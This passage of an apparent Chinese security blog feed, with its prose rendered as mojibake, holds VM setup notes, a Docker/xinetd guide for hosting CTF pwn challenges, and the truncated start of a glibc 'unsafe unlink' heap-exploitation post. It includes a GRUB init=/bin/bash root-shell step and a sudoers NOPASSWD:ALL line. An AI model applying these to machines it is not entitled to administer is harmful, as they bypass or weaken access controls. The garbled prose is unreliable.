class="code"><pre><span class="line">sudo mkfontscale</span><br><span class="line">sudo mkfontdir</span><br><span class="line">sudo fc-cache</span><br></pre></td></tr></table></figure><h2 id="å…±äº«æ–‡ä»¶å¤¹"><a href="#å…±äº«æ–‡ä»¶å¤¹" class="headerlink" title="å…±äº«æ–‡ä»¶å¤¹"></a>å…±äº«æ–‡ä»¶å¤¹</h2><ul><li>æŒ‚è½½äº†ï¼Œä½†æ˜¯ä¸æ˜¾ç¤º</li></ul><h3 id="ubuntu"><a href="#ubuntu" class="headerlink" title="ubuntu"></a>ubuntu</h3><ul><li>mount</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mount -t fuse.vmhgfs-fuse .host:/ /mnt/hgfs -o allow_other</span><br></pre></td></tr></table></figure><ul><li>&#x2F;etc&#x2F;fstab</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Â .host:/ /mnt/hgfs fuse.vmhgfs-fuse allow_other 0 0</span><br></pre></td></tr></table></figure><h3 id="kali"><a href="#kali" class="headerlink" title="kali"></a>kali</h3><ul><li>mount</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mount -t fuse.vmhgfs-fuse .host:/ /mnt/hgfs -o allow_other</span><br></pre></td></tr></table></figure><ul><li>&#x2F;etc&#x2F;fstab</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vmhgfs-fuse /mnt/hgfs/ fuse defaults,allow_other 0 0</span><br></pre></td></tr></table></figure><h2 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h2><ul><li>å®‰è£…</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install docker.io</span><br><span class="line">sudo apt install docker-compose</span><br></pre></td></tr></table></figure><ul><li>å½“å‰ç”¨æˆ·åŠ å…¥dockerç»„</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo usermod -aG docker <span class="variable">$USER</span>  </span><br><span class="line">newgrp docker</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure><h2 id="ç½‘ç»œ"><a href="#ç½‘ç»œ" class="headerlink" title="ç½‘ç»œ"></a>ç½‘ç»œ</h2><ul><li>å‡ºç°è·å¾—ä¸äº†IPåœ°å€çš„æƒ…å†µ</li></ul><ol><li>kali ä¿®æ”¹ <code>/etc/network/interfaces</code></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æ‰¾ç½‘å¡å</span></span><br><span class="line">ifconfig</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¿®æ”¹ interfaces æ–‡ä»¶</span></span><br><span class="line">auto eth0</span><br><span class="line">iface eth0 inet dhcp</span><br><span class="line"></span><br><span class="line"><span class="comment"># é‡å¯æœåŠ¡</span></span><br><span class="line">/etc/init.d/networkingÂ restart</span><br><span class="line">ifconfigÂ eth0 down    </span><br><span class="line">ifconfigÂ eth0 up</span><br></pre></td></tr></table></figure><ol start="2"><li>ubuntu ä½¿ç”¨å‘½ä»¤ï¼Œä½†æ˜¯é‡å¯ååˆä¸è¡Œ</li></ol><ul><li>ifconfig é…ç½®IP</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ifconfig ens33 &lt;IP&gt; netmask &lt;mask&gt;</span><br><span class="line">route add default gw &lt;gateway&gt;</span><br></pre></td></tr></table></figure><ul><li>ç„¶åä½¿ç”¨å¦‚ä¸‹å‘½ä»¤</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /sbin/dhclient</span><br></pre></td></tr></table></figure><ol start="3"><li>ubuntu ä¿®æ”¹ æ–‡ä»¶</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/netplan/01-network-manager-all.yaml</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¿®æ”¹å†…å®¹</span></span><br><span class="line">network:</span><br><span class="line">  version: 2</span><br><span class="line">  renderer: NetworkManager</span><br><span class="line">  ethernets:</span><br><span class="line">     eth0:</span><br><span class="line">       dhcp4: <span class="built_in">yes</span></span><br><span class="line">       addresses: []</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ‰§è¡Œå‘½ä»¤</span></span><br><span class="line">sudo netplan try</span><br><span class="line">sudo netplan apply</span><br></pre></td></tr></table></figure><ul><li>åœ¨ä¿®æ”¹ <code>/etc/NetworkManager/NetworkManager.conf</code> é…ç½®æ–‡ä»¶çš„ <code>managed = true</code></li><li>reboot</li><li>åæ¥çœ‹äº†è¿™ä¸ªæ–‡ç« è§£å†³ <a href="https://www.zhangguojian.com/2020/11/27/ubuntu-vmware-workstation-can-not-connect-network/#%E6%89%8B%E5%8A%A8%E8%8E%B7%E5%8F%96-ip">Ubuntu20.04ä¸èƒ½è¿æ¥ç½‘ç»œåŠè§£å†³å¼€æœºè‡ªåŠ¨è·å– ip é—®é¢˜</a></li></ul><ol start="4"><li>å¦‚ä¸‹å‘½ä»¤</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo nmcli networking off </span><br><span class="line">sudo nmcli networking on</span><br></pre></td></tr></table></figure><h2 id="sudo-å…å¯†"><a href="#sudo-å…å¯†" class="headerlink" title="sudo å…å¯†"></a>sudo å…å¯†</h2><ul><li>ä¿®æ”¹ <code>/etc/sudoers</code> æ·»åŠ ç”¨æˆ·æˆ–è€…ç»„</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æŒ‡å®šå‘½ä»¤å…å¯†</span></span><br><span class="line">&lt;name&gt; ALL=(ALL:ALL) NOPASSWD:/bin/useradd,/bin/chown</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ‰€æœ‰çš„éƒ½å…å¯†</span></span><br><span class="line">&lt;name&gt; ALL=(ALL:ALL) NOPASSWD:ALL</span><br></pre></td></tr></table></figure><h2 id="å†…å­˜é—®é¢˜"><a href="#å†…å­˜é—®é¢˜" class="headerlink" title="å†…å­˜é—®é¢˜"></a>å†…å­˜é—®é¢˜</h2><h3 id="å‹ç¼©"><a href="#å‹ç¼©" class="headerlink" title="å‹ç¼©"></a>å‹ç¼©</h3><ul><li><p><strong>åˆ é™¤å¿«ç…§åä»»æ˜¾ç¤ºå­˜åœ¨å¿«ç…§ï¼Œå¦‚ä½•åˆ é™¤å¹²å‡€</strong>ï¼šæ–°å»ºä¸€ä¸ªï¼Œç„¶ååˆ é™¤ï¼ŒVMä¼šæŠŠä¹‹å‰çš„å¿«ç…§åˆå¹¶ååˆ é™¤ã€‚</p><ul><li><a href="https://kb.vmware.com/s/article/1023657?lang=zh_CN">åˆ é™¤æ‰€æœ‰å¿«ç…§å’Œæ•´åˆå¿«ç…§åŠŸèƒ½å¸¸è§é—®é¢˜è§£ç­”(vmware.com)</a></li></ul></li><li><p>å½“æˆ‘ä»¬åˆ é™¤éƒ¨åˆ†å¤§æ–‡ä»¶æ—¶ï¼Œå‘ç°è‡ªå·±ç£ç›˜çš„å†…å­˜æ²¡æœ‰å¢åŠ ã€‚vmdkæ–‡ä»¶ä¸ä¼šä¸»åŠ¨å›ç¼©ï¼Œéœ€è¦æ‰‹åŠ¨åšshrinkã€‚å¹¶ä¸”ä¸èƒ½æœ‰å¿«ç…§</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo vmware-toolbox-cmd disk list</span><br><span class="line">$ sudo vmware-toolbox-cmd disk shrink /</span><br></pre></td></tr></table></figure><ul><li>ç„¶åé‡å¯</li></ul><h2 id="kali-æ— æ³•è¿›å…¥console"><a href="#kali-æ— æ³•è¿›å…¥console" class="headerlink" title="kali æ— æ³•è¿›å…¥console"></a>kali æ— æ³•è¿›å…¥console</h2><ul><li>æˆ‘çš„æƒ…å†µæ˜¯ fstab å‡ºç°é—®é¢˜ï¼Œå…±äº«æ–‡ä»¶å¤¹ä¿®æ”¹ fstab</li></ul><ol><li>é‡å¯ï¼Œè¿›å…¥ grubåŠ è½½é¡¹</li><li>e è¿›å…¥é…ç½®</li></ol><p>![[..&#x2F;imgs&#x2F;Pasted image 20230929200253.png]]</p><ol start="3"><li>ä¿®æ”¹ linux ä¸­çš„ ro &#x3D;&gt; <code>rw</code> å¹¶åŠ å…¥ä¸€å¥ <code>init=/bin/bash</code></li><li>f10 è¿›å…¥ç³»ç»Ÿ</li><li>ä¿®æ”¹ fstabï¼Œé‡å¯é‡æ–°è·å¾—ç•Œé¢</li></ol><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><ul><li>zsh è‡ªå¸¦æ’ä»¶ <a href="https://github.com/ohmyzsh/ohmyzsh/wiki/Plugins">Plugins Â· ohmyzsh&#x2F;ohmyzsh Wiki</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> MISC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> VM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF å‡ºé¢˜</title>
      <link href="/2023/09/16/CTF%20%E5%87%BA%E9%A2%98%E7%8E%AF%E5%A2%83/"/>
      <url>/2023/09/16/CTF%20%E5%87%BA%E9%A2%98%E7%8E%AF%E5%A2%83/</url>
      
        <content type="html"><![CDATA[<blockquote><p>æ€ä¹ˆå‡ºé¢˜éƒ¨ç½²ç¯å¢ƒï¼Ÿ</p></blockquote><span id="more"></span><h3 id="dockeréƒ¨ç½²"><a href="#dockeréƒ¨ç½²" class="headerlink" title="dockeréƒ¨ç½²"></a>dockeréƒ¨ç½²</h3><ol><li>é¦–å…ˆè‚¯å®šæ˜¯å®‰è£…docker</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install docker.io</span><br></pre></td></tr></table></figure><ol start="2"><li>å†™é¢˜ç›®</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">chall</span><br><span class="line">â”œâ”€â”€ flag.txt</span><br><span class="line">â”œâ”€â”€ vuln</span><br><span class="line">â”œâ”€â”€ vuln.c</span><br><span class="line">â””â”€â”€ Makefile</span><br></pre></td></tr></table></figure><ol start="3"><li>docker éƒ¨ç½²ï¼Œåœ¨åŒçº§ç›®å½•æ·»åŠ  Dockerfileï¼ŒåŒæ—¶é…åˆ xinetd<ul><li>ä¿®æ”¹æ–‡ä»¶ä¸­å†…å®¹ï¼Œçœ‹æ³¨é‡Š</li></ul></li></ol><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu:<span class="number">20.04</span></span><br><span class="line"><span class="keyword">ENV</span> DEBIAN_FRONTEND noninteractive</span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get -y update --fix-missing &amp;&amp; apt-get -y dist-upgrade</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get -y install lib32z1 xinetd</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> groupadd -r pwn &amp;&amp; useradd -r -g pwn pwn</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">echo</span> <span class="string">&#x27;#!/bin/bash\n    \</span></span></span><br><span class="line"><span class="string"><span class="language-bash">service xinetd restart &amp;&amp; /bin/sleep infinity&#x27;</span> &gt; /etc/init.sh</span></span><br><span class="line"></span><br><span class="line"><span class="comment">###### change server</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">echo</span> <span class="string">&#x27;service pwn\n       \</span></span></span><br><span class="line"><span class="string"><span class="language-bash">&#123;\n                           \</span></span></span><br><span class="line"><span class="string"><span class="language-bash">  type = UNLISTED\n           \</span></span></span><br><span class="line"><span class="string"><span class="language-bash">  disable = no\n              \</span></span></span><br><span class="line"><span class="string"><span class="language-bash">  socket_type = stream\n      \</span></span></span><br><span class="line"><span class="string"><span class="language-bash">  protocol = tcp\n            \</span></span></span><br><span class="line"><span class="string"><span class="language-bash">  wait = no\n                 \</span></span></span><br><span class="line"><span class="string"><span class="language-bash">  user = pwn\n                \</span></span></span><br><span class="line"><span class="string"><span class="language-bash">  bind = 0.0.0.0\n            \</span></span></span><br><span class="line"><span class="string"><span class="language-bash">  port = 9999\n               \</span></span></span><br><span class="line"><span class="string"><span class="language-bash">  server = /home/pwn/vuln\n   \         </span></span></span><br><span class="line">&#125;<span class="string">&#x27; &gt; /etc/xinetd.d/pwn</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">RUN chmod 500 /etc/init.sh</span></span><br><span class="line"><span class="string">RUN chmod 444 /etc/xinetd.d/pwn </span></span><br><span class="line"><span class="string">RUN chmod 1733 /tmp /var/tmp /dev/shm</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">ADD chall/flag.txt /flag.txt            ####### change flag</span></span><br><span class="line"><span class="string">RUN chmod 444 /flag.txt               </span></span><br><span class="line"><span class="string">RUN mv /flag.txt /flag-$(md5sum flag.txt | awk &#x27;</span>&#123;print $<span class="number">1</span>&#125;<span class="string">&#x27;).txt</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">WORKDIR /home/pwn</span></span><br><span class="line"><span class="string">ADD chall/vuln .                        ###### change chall file</span></span><br><span class="line"><span class="string">RUN chmod 550 vuln</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">RUN chown -R root:pwn /home/pwn</span></span><br><span class="line"><span class="string">RUN service xinetd restart</span></span><br></pre></td></tr></table></figure><ol start="4"><li>docker-compose.yml<ul><li>è‡ªå·±æ›´æ”¹ç«¯å£å°±è¡Œ</li></ul></li></ol><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;3&#x27;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">vuln:</span>                       <span class="comment"># change name</span></span><br><span class="line">    <span class="attr">build:</span> <span class="string">.</span></span><br><span class="line">    <span class="attr">ulimits:</span></span><br><span class="line">      <span class="attr">nproc:</span> <span class="number">65535</span></span><br><span class="line">      <span class="attr">core:</span> <span class="number">0</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;1234:9999&quot;</span>           <span class="comment"># change port</span></span><br><span class="line">    <span class="attr">entrypoint:</span> <span class="string">/etc/init.sh</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">unless-stopped</span></span><br></pre></td></tr></table></figure><ul><li>å¯åŠ¨</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up</span><br></pre></td></tr></table></figure><p><strong>å‘ç‚¹</strong>ï¼šdockeréƒ¨ç½²é¢˜ç›®æ—¶ï¼Œåœ¨ç¨‹åºé‡Œå¿…é¡»å°†ç¼“å†²å™¨ç½®ä¸º0ï¼Œå¦åˆ™ä¸ä¼šæ˜¾ç¤ºï¼Ÿ</p><h3 id="ctf-xinetd"><a href="#ctf-xinetd" class="headerlink" title="ctf_xinetd"></a>ctf_xinetd</h3><ul><li><p>ä¸‹è½½è¿™ä¸ªé“¾æ¥ <a href="https://github.com/Eadom/ctf_xinetd">ctf_xinetd</a>ï¼Œéƒ¨ç½²æ¯”è¾ƒç®€å•ã€‚</p></li><li><p>ä¿®æ”¹ binç›®å½• é‡Œçš„ äºŒè¿›åˆ¶æ–‡ä»¶å’Œ flag æ–‡ä»¶</p></li><li><p>dockerfile ä¿®æ”¹ä¸€è¡Œ</p></li></ul><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">cp</span> -R /lib* /home/ctf &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">cp</span> -R /usr/lib* /home/ctf</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ”¹ä¸º</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">cp</span> -R /usr/lib* /home/ctf</span></span><br></pre></td></tr></table></figure><ul><li>ctf.xinetd ä¿®æ”¹</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">server_args = --userspec=1000:1000 /home/ctf ./helloworld</span><br><span class="line"></span><br><span class="line"># ä¿®æ”¹</span><br><span class="line">server_args = --userspec=1000:1000 /home/ctf è‡ªå·±çš„æ¼æ´ç¨‹åº</span><br></pre></td></tr></table></figure><ul><li>æœ€åæ‰§è¡ŒREADME é‡Œçš„ ä¸¤æ¡å‘½ä»¤å°±è¡Œï¼Œæ¯”å¦‚</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker build -t <span class="string">&quot;vuln&quot;</span> .</span><br><span class="line"></span><br><span class="line"><span class="comment"># å°†pub_port è‡ªå·±æƒ³è¦çš„ç«¯å£</span></span><br><span class="line">docker run -d -p <span class="string">&quot;0.0.0.0:pub_port:9999&quot;</span> -h <span class="string">&quot;vuln&quot;</span> --name=<span class="string">&quot;vuln&quot;</span> vuln</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹äº†ä¸€çœ¼å…¶å†…å®¹ï¼Œä½¿ç”¨ chrootæ²™ç›’ï¼Œå°†æ–‡ä»¶ç³»ç»Ÿçš„æ ¹ç›®å½•è½¬åŒ–ä¸ºåŸå…ˆçš„ <code>/home/ctf</code> ç›®å½•ï¼Œæ‰€ä»¥è¦åœ¨dockerfileä¸­å°†libå…¨éƒ¨æ‹·è´ä¸€ä»½</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">server      = /usr/sbin/chroot</span><br></pre></td></tr></table></figure><h3 id="pwn-deploy-chroot"><a href="#pwn-deploy-chroot" class="headerlink" title="pwn_deploy_chroot"></a>pwn_deploy_chroot</h3><ul><li>éƒ¨ç½²å¤šé“ctfé¢˜ç›®ï¼š <a href="https://github.com/giantbranch/pwn_deploy_chroot">giantbranch&#x2F;pwn_deploy_chroot</a>ï¼Œ<a href="http://www.giantbranch.cn/2018/09/24/%E5%A6%82%E4%BD%95%E5%AE%89%E5%85%A8%E5%BF%AB%E9%80%9F%E5%9C%B0%E9%83%A8%E7%BD%B2%E5%A4%9A%E9%81%93ctf%20pwn%E6%AF%94%E8%B5%9B%E9%A2%98%E7%9B%AE/">æ•™ç¨‹</a> å†™çš„å¾ˆè¯¦ç»†ã€‚ä½¿ç”¨èµ·æ¥ä¹Ÿå¾ˆå®¹æ˜“</li></ul><h3 id="kernel"><a href="#kernel" class="headerlink" title="kernel"></a>kernel</h3><ul><li>å†…æ ¸é¢˜ç›®éƒ¨ç½²ï¼Œä½¿ç”¨ ctf_xinetd ä¸¾ä¾‹</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">chall  </span><br><span class="line">â”œâ”€â”€ ctf.xinetd  </span><br><span class="line">â”œâ”€â”€ Dockerfile  </span><br><span class="line">â”œâ”€â”€ bin  </span><br><span class="line">â”‚ â”œâ”€â”€ run.sh  </span><br><span class="line">â”‚ â”œâ”€â”€ bzImage  </span><br><span class="line">â”‚ â””â”€â”€ rootfs.cpio  </span><br><span class="line">â”œâ”€â”€ README.md</span><br><span class="line">â””â”€â”€ start.sh </span><br></pre></td></tr></table></figure><ul><li>docker å®‰è£…ç¯å¢ƒ</li></ul><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu:<span class="number">20.04</span>  </span><br><span class="line"></span><br><span class="line">DEBIAN_FRONTEND=noninteractive</span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> sed -i <span class="string">&quot;s/http:\/\/archive.ubuntu.com/http:\/\/mirrors.tuna.tsinghua.edu.cn/g&quot;</span> /etc/apt/sources.list &amp;&amp; \  </span></span><br><span class="line">apt-get update &amp;&amp; apt-get -y dist-upgrade &amp;&amp; \  </span><br><span class="line">apt-get install -y lib32z1 xinetd git libglib2.<span class="number">0</span>-dev libfdt-dev \</span><br><span class="line">libpixman-<span class="number">1</span>-dev zlib1g-dev qemu qemu-system-x86  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> useradd -m pwn</span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /</span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./ctf.xinetd /etc/xinetd.d/ctf</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./start.sh /start.sh </span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">echo</span> <span class="string">&quot;Blocked by ctf_xinetd&quot;</span> &gt; /etc/banner_fail</span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> +x /start.sh  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./chall/ /  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;/run.sh&quot;</span>]  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">25000</span></span><br></pre></td></tr></table></figure><ul><li>é‡è¦çš„æ˜¯ä¿®æ”¹ ctf.xinetd  æ–‡ä»¶</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">service ctf  </span><br><span class="line">&#123;  </span><br><span class="line"><span class="built_in">disable</span> = no  </span><br><span class="line">socket_type = stream  </span><br><span class="line">protocol = tcp  </span><br><span class="line"><span class="built_in">wait</span> = no  </span><br><span class="line">user = pwn  </span><br><span class="line"><span class="built_in">type</span> = UNLISTED  </span><br><span class="line">port = 25000  </span><br><span class="line"><span class="built_in">bind</span> = 0.0.0.0  </span><br><span class="line">server = /run.sh    <span class="comment"># ä¿®æ”¹å¤„</span></span><br><span class="line"><span class="comment"># replace helloworld to your program  </span></span><br><span class="line">banner_fail = /etc/banner_fail  </span><br><span class="line"><span class="comment"># safety options  </span></span><br><span class="line">per_source = 10 <span class="comment"># the maximum instances of this service per source IP address  </span></span><br><span class="line">rlimit_cpu = 20 <span class="comment"># the maximum number of CPU seconds that the service may use  </span></span><br><span class="line"><span class="comment">#rlimit_as = 1024M # the Address Space resource limit for the service  </span></span><br><span class="line"><span class="comment">#access_times = 2:00-9:00 12:00-24:00  </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CSE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>unsafe unlink</title>
      <link href="/2023/09/13/unsafe%20unlink/"/>
      <url>/2023/09/13/unsafe%20unlink/</url>
      
        <content type="html"><![CDATA[<blockquote><p>ç»å…¸æ¼æ´</p></blockquote><span id="more"></span><h2 id="Glibc-unlink"><a href="#Glibc-unlink" class="headerlink" title="Glibc unlink"></a>Glibc unlink</h2><p>å½“ä¸€ä¸ª free chunk ä»åŒå‘é“¾è¡¨çš„ bins ä¸­å–å‡ºæ—¶ï¼ˆå †çš„åˆå¹¶ï¼‰ï¼Œè¿™ä¸ªè¿‡ç¨‹å°±æ˜¯ unlinkã€‚</p><p>å †çš„åˆå¹¶ä¸»è¦çœ‹è¿™ä¸€æ®µä»£ç ï¼Œå­˜åœ¨ä¸¤ç§åˆå¹¶æ–¹å¼</p><ul><li>int_free å‚æ•°ï¼špæ˜¯æ­£åœ¨freeçš„chunkï¼Œav æŒ‡ arena(struct malloc_state)ï¼Œlocké¿å…æ¡ä»¶ç«äº‰</li><li>å‘ååˆå¹¶ï¼šprev_inuseä½ä¸º0ï¼Œä¼šå‘ç”Ÿunsorted binä¹‹é—´åˆå¹¶ï¼Œä¼šæ£€æŸ¥prev_size å’Œ æƒ³è¦åˆå¹¶çš„ bin çš„ size æ˜¯å¦ç›¸åŒã€‚unlink prev_chunk</li><li>å‘å‰åˆå¹¶ï¼šä¸æ˜¯top_chunk, unlink nextchunkã€‚</li><li>è‡³äºæ–¹å‘ï¼šåœ¨æ²¡æœ‰ç¿»è¯‘é”™è¯¯çš„æƒ…å†µä¸‹ï¼Œæœ‰ç‚¹ç»•ï¼Œä½†æ˜¯å¯ä»¥å¼ºè¡Œè§£é‡Šï¼Œå› ä¸ºå †å¾€é«˜åœ°å€ç”Ÿé•¿ï¼Œå‘å‰å°±æ˜¯å‘é«˜åœ°å€åˆå¹¶ï¼Œå‘åå°±æ˜¯å‘ä½åœ°å€åˆå¹¶ï¼Ÿ</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> 